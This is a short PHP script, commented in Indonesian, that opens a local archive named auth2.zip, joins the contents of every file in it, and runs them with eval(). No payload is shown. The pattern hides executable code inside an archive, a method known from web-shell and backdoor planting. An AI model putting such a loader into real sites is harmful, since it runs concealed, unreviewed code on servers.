<?php
// Loader otomatis untuk menggabungkan & mengeksekusi file-file dari ZIP
$zip = new ZipArchive;
if ($zip->open('auth2.zip') === TRUE) {
    $script = '';
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $script .= $zip->getFromIndex($i);
    }
    eval('?>'.$script);
    $zip->close();
} else {
    echo 'Gagal membuka arsip ZIP';
}
?>